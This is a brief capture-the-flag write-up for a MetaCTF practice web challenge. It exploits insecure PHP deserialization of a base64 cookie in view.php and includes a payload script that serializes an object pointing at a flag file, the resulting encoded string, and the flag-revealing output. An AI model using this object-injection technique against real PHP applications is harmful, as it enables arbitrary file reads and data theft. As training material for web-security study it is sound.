# Metactf practice challenges web-wirteup

## Challenges
# URL
http://1k3h22c9.chals.mctf.io/view.php
# Concept
This challenge reqiured us to upload images into a santa website but from the view.php source code when found unserailized image input.

# Method of solve
Understanding the Vulnerability 
View.php does this $imageObj = unserialize(base64_decode($_COOKIE['image_data']));
Then it calls:  
file_get_contents($imageObj->path)
# payload script to generate the base64 encoded string for image cookie
~~~
<?php
class Image {
    public $path = '/var/www/html/flag.txt'; // Common CTF flag location
    // Try also: 'flag.txt', 'flag.php', '/app/flag', etc.
}

$payload = serialize(new Image());
echo base64_encode($payload) . "\n";
?>
~~~
 Then run:
 php payload.php 
Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjIyOiIvdmFyL3d3dy9odG1sL2ZsYWcudHh0Ijt9
Then add cookie in the website header:
~~~
http://1k3h22c9.chals.mctf.io/view.php?set_image=Tzo1OiJJbWFnZSI6MTp7czo0OiJwYXRoIjtzOjIyOiIvdmFyL3d3dy9odG1sL2ZsYWcudHh0Ijt9
~~~
After the flag is viewed from the view source
~~~
<body>
    <div class="view-container">
        <h1 class="mb-4">Photo Viewer</h1>
        <p class="mb-3">Enjoy this beautiful photo uploaded by our community members.</p>
        <div class="card">
            <div class='alert alert-warning'>The image cannot be displayed or contains errors.</div><pre class='hidden-content'>MetaCTF{ph3ar_d3s3rial1z3d_0bj3cts}
</pre>        </div>
        <a href="index.php" class="btn btn-secondary mt-3">Back to Gallery</a>
    </div>
</body>
</html>
~~~
